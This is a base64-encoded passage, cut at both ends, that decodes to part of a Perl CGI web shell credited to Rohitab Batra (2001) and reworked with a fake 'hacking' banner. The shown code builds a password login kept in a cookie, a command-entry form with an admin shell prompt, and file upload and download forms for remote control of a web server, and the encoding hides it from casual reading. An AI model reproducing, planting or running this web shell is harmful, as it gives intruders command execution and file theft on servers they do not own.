ZXIiPkRvbWFpbnMvVXNlcnM8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5Mb2dvdXQ8L2E+IHwKPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9IiMiPkhlbHA8L2E+Cgo8L2ZvbnQ+PC90ZD4KPC90cj4KPC90YWJsZT4KPGZvbnQgaWQ9IlJlc3BvbnNlRGF0YSIgY29sb3I9IiNmZjk5Y2MiID4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luU2NyZWVuCnsKCglwcmludCA8PEVORDsKPHByZT48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+ClR5cGluZ1RleHQgPSBmdW5jdGlvbihlbGVtZW50LCBpbnRlcnZhbCwgY3Vyc29yLCBmaW5pc2hlZENhbGxiYWNrKSB7CiAgaWYoKHR5cGVvZiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCA9PSAidW5kZWZpbmVkIikgfHwgKHR5cGVvZiBlbGVtZW50LmlubmVySFRNTCA9PSAidW5kZWZpbmVkIikpIHsKICAgIHRoaXMucnVubmluZyA9IHRydWU7CS8vIE5ldmVyIHJ1bi4KICAgIHJldHVybjsKICB9CiAgdGhpcy5lbGVtZW50ID0gZWxlbWVudDsKICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2sgPSAoZmluaXNoZWRDYWxsYmFjayA/IGZpbmlzaGVkQ2FsbGJhY2sgOiBmdW5jdGlvbigpIHsgcmV0dXJuOyB9KTsKICB0aGlzLmludGVydmFsID0gKHR5cGVvZiBpbnRlcnZhbCA9PSAidW5kZWZpbmVkIiA/IDEwMCA6IGludGVydmFsKTsKICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5lbGVtZW50LmlubmVySFRNTDsKICB0aGlzLnVucGFyc2VkT3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0OwogIHRoaXMuY3Vyc29yID0gKGN1cnNvciA/IGN1cnNvciA6ICIiKTsKICB0aGlzLmN1cnJlbnRUZXh0ID0gIiI7CiAgdGhpcy5jdXJyZW50Q2hhciA9IDA7CiAgdGhpcy5lbGVtZW50LnR5cGluZ1RleHQgPSB0aGlzOwogIGlmKHRoaXMuZWxlbWVudC5pZCA9PSAiIikgdGhpcy5lbGVtZW50LmlkID0gInR5cGluZ3RleHQiICsgVHlwaW5nVGV4dC5jdXJyZW50SW5kZXgrKzsKICBUeXBpbmdUZXh0LmFsbC5wdXNoKHRoaXMpOwogIHRoaXMucnVubmluZyA9IGZhbHNlOwogIHRoaXMuaW5UYWcgPSBmYWxzZTsKICB0aGlzLnRhZ0J1ZmZlciA9ICIiOwogIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7CiAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiI7Cn0KVHlwaW5nVGV4dC5hbGwgPSBuZXcgQXJyYXkoKTsKVHlwaW5nVGV4dC5jdXJyZW50SW5kZXggPSAwOwpUeXBpbmdUZXh0LnJ1bkFsbCA9IGZ1bmN0aW9uKCkgewogIGZvcih2YXIgaSA9IDA7IGkgPCBUeXBpbmdUZXh0LmFsbC5sZW5ndGg7IGkrKykgVHlwaW5nVGV4dC5hbGxbaV0ucnVuKCk7Cn0KVHlwaW5nVGV4dC5wcm90b3R5cGUucnVuID0gZnVuY3Rpb24oKSB7CiAgaWYodGhpcy5ydW5uaW5nKSByZXR1cm47CiAgaWYodHlwZW9mIHRoaXMub3JpZ1RleHQgPT0gInVuZGVmaW5lZCIpIHsKICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsJLy8gV2UgaGF2ZW4ndCBmaW5pc2hlZCBsb2FkaW5nIHlldC4gIEhhdmUgcGF0aWVuY2UuCiAgICByZXR1cm47CiAgfQogIGlmKHRoaXMuY3VycmVudFRleHQgPT0gIiIpIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSAiIjsKLy8gIHRoaXMub3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0LnJlcGxhY2UoLzwoW148XSkqPi8sICIiKTsgICAgIC8vIFN0cmlwIEhUTUwgZnJvbSB0ZXh0LgogIGlmKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCkgewogICAgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjwiICYmICF0aGlzLmluVGFnKSB7CiAgICAgIHRoaXMudGFnQnVmZmVyID0gIjwiOwogICAgICB0aGlzLmluVGFnID0gdHJ1ZTsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIj4iICYmIHRoaXMuaW5UYWcpIHsKICAgICAgdGhpcy50YWdCdWZmZXIgKz0gIj4iOwogICAgICB0aGlzLmluVGFnID0gZmFsc2U7CiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy50YWdCdWZmZXI7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMuaW5UYWcpIHsKICAgICAgdGhpcy50YWdCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICImIiAmJiAhdGhpcy5pbkhUTUxFbnRpdHkpIHsKICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiYiOwogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IHRydWU7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI7IiAmJiB0aGlzLmluSFRNTEVudGl0eSkgewogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gIjsiOwogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOwogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMuSFRNTEVudGl0eUJ1ZmZlcjsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgaWYodGhpcy5pbkhUTUxFbnRpdHkpIHsKICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOwogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICAgIHRoaXMucnVuKCk7CiAgICAgIHJldHVybjsKICAgIH0gZWxzZSB7CiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7CiAgICB9CiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gdGhpcy5jdXJyZW50VGV4dDsKICAgIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgKz0gKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCAtIDEgPyAodHlwZW9mIHRoaXMuY3Vyc29yID09ICJmdW5jdGlvbiIgPyB0aGlzLmN1cnNvcih0aGlzLmN1cnJlbnRUZXh0KSA6IHRoaXMuY3Vyc29yKSA6ICIiKTsKICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsKICB9IGVsc2UgewoJdGhpcy5jdXJyZW50VGV4dCA9ICIiOwoJdGhpcy5jdXJyZW50Q2hhciA9IDA7CiAgICAgICAgdGhpcy5ydW5uaW5nID0gZmFsc2U7CiAgICAgICAgdGhpcy5maW5pc2hlZENhbGxiYWNrKCk7CiAgfQp9Cjwvc2NyaXB0Pgo8L3ByZT4KCjxmb250IHN0eWxlPSJmb250OiAxNXB0IFZlcmRhbmE7IGNvbG9yOiB5ZWxsb3c7Ij5Db3B5cmlnaHQgKEMpIDIwMDEgUm9oaXRhYiBCYXRyYSA8L2ZvbnQ+PGJyPjxicj4KPHRhYmxlIGFsaWduPSJjZW50ZXIiIGJvcmRlcj0iMSIgd2lkdGg9IjYwMCIgaGVpZ2g+Cjx0Ym9keT48dHI+Cjx0ZCB2YWxpZ249InRvcCIgYmFja2dyb3VuZD0iaHR0cDovL2RsLmRyb3Bib3guY29tL3UvMTA4NjAwNTEvaW1hZ2VzL21hdHJhbi5naWYiPjxwIGlkPSJoYWNrIiBzdHlsZT0ibWFyZ2luLWxlZnQ6IDNweDsiPgo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+IFBsZWFzZSBXYWl0IC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+IDxicj4KCjxmb250IGNvbG9yPSIjMDA5OTAwIj4gVHJ5aW5nIGNvbm5lY3QgdG8gU2VydmVyIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPgo8Zm9udCBjb2xvcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPn5cJDwvZm9udD4gQ29ubmVjdGVkICEgPC9mb250Pjxicj4KPGZvbnQgY29sb3I9IiMwMDk5MDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+IENoZWNraW5nIFNlcnZlciAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250PiA8YnI+Cgo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD4gVHJ5aW5nIGNvbm5lY3QgdG8gQ29tbWFuZCAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPgoKPGZvbnQgY29sb3I9IiNGMDAwMDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+XCQgQ29ubmVjdGVkIENvbW1hbmQhIDwvZm9udD48YnI+Cjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PGZvbnQgY29sb3I9IiNGMDAwMDAiPlwkPC9mb250PjwvZm9udD4gT0shIFlvdSBjYW4ga2lsbCBpdCE8L2ZvbnQ+CjwvdHI+CjwvdGJvZHk+PC90YWJsZT4KPGJyPgoKPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgpuZXcgVHlwaW5nVGV4dChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaGFjayIpLCAzMCwgZnVuY3Rpb24oaSl7IHZhciBhciA9IG5ldyBBcnJheSgiXyIsIiIpOyByZXR1cm4gIiAiICsgYXJbaS5sZW5ndGggJSBhci5sZW5ndGhdOyB9KTsKVHlwaW5nVGV4dC5ydW5BbGwoKTsKCjwvc2NyaXB0PgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEFkZCBodG1sIHNwZWNpYWwgY2hhcnMKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgSHRtbFNwZWNpYWxDaGFycygkKXsKCW15ICR0ZXh0ID0gc2hpZnQ7CgkkdGV4dCA9fiBzLyYvJmFtcDsvZzsKCSR0ZXh0ID1+IHMvIi8mcXVvdDsvZzsKCSR0ZXh0ID1+IHMvJy8mIzAzOTsvZzsKCSR0ZXh0ID1+IHMvPC8mbHQ7L2c7CgkkdGV4dCA9fiBzLz4vJmd0Oy9nOwoJcmV0dXJuICR0ZXh0Owp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBBZGQgbGluayBmb3IgZGlyZWN0b3J5CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEFkZExpbmtEaXIoJCkKewoJbXkgJGFjPXNoaWZ0OwoJbXkgQGRpcj0oKTsKCWlmKCRXaW5OVCkKCXsKCQlAZGlyPXNwbGl0KC9cXC8sJEN1cnJlbnREaXIpOwoJfWVsc2UKCXsKCQlAZGlyPXNwbGl0KCIvIiwmdHJpbSgkQ3VycmVudERpcikpOwoJfQoJbXkgJHBhdGg9IiI7CglteSAkcmVzdWx0PSIiOwoJZm9yZWFjaCAoQGRpcikKCXsKCQkkcGF0aCAuPSAkXy4kUGF0aFNlcDsKCQkkcmVzdWx0Lj0iPGEgaHJlZj0nP2E9Ii4kYWMuIiZkPSIuJHBhdGguIic+Ii4kXy4kUGF0aFNlcC4iPC9hPiI7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQp7CglwcmludCA8PEVORDsKPGJyPkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4KClBhc3N3b3JkOjxicj4KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRm9ybQp7CglwcmludCA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+CkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4KUGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4KPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRNTCBQYWdlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50UGFnZUZvb3Rlcgp7CglwcmludCAiPGJyPjxmb250IGNvbG9yPXJlZD5vLS0tWyAgPGZvbnQgY29sb3I9I2ZmOTkwMD5FZGl0IGJ5ICRFZGl0UGVyc2lvbiA8L2ZvbnQ+ICBdLS0tbzwvZm9udD48L2NvZGU+PC9jZW50ZXI+PC9ib2R5PjwvaHRtbD4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUKIyB2YXJpYWJsZSAkQ29va2llc3snJ30KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgR2V0Q29va2llcwp7CglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOwoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykKCXsKCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7CgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9nb3V0U2NyZWVuCnsKCXByaW50ICJDb25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2FpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3JtTG9nb3V0CnsKCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUKCSZQcmludFBhZ2VIZWFkZXIoInAiKTsKCSZQcmludExvZ291dFNjcmVlbjsKCgkmUHJpbnRMb2dpblNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7CglleGl0Owp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9naW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdAojIGRpc3BsYXlzIGEgcGFnZSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBydW4gY29tbWFuZHMuIElmIHRoZSBwYXNzd29yZCBkb2Vucyd0CiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyCiMgdG8gbG9naW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ2luIAp7CglpZigkTG9naW5QYXNzd29yZCBlcSAkUGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZAoJewoJCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD0kTG9naW5QYXNzd29yZDtcbiI7CgkJJlByaW50UGFnZUhlYWRlcjsKCQlwcmludCAmTGlzdERpcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3JlZW47CgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZAoJCXsKCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOwoKCQl9CgkJJlByaW50TG9naW5Gb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJZXhpdDsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0KewoJbXkgJGRpcj0gIjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiY29tbWFuZCIpLiI8L3NwYW4+IjsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyM2NmZmNjYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgokUHJvbXB0CjxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI1MCIgbmFtZT0iYyI+CjxpbnB1dCBjbGFzcz0ic3VibWl0InR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQp7CglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IAoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+CiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IGNsYXNzPSJmaWxlIiB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KRG93bmxvYWQ6IDxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+Cgo8L2Zvcm0+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0KewoJbXkgJGRpcj0gJkFkZExpbmtEaXIoInVwbG9hZCIpOwoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CiRQcm9tcHQgdXBsb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+Ck9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgaWQ9InVwIiB2YWx1ZT0ib3ZlcndyaXRlIj4KPGxhYmVsIGZvcj0idXAiPk92ZXJ3cml0ZSBpZiBpdCBFeGlzdHM8L2xhYmVsPjxicj48YnI+ClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgo8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4KCjwvZm9ybT4KCkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBDb21tYW5kVGltZW91dAp7CglpZighJFdpbk5UKQoJewoJCWFs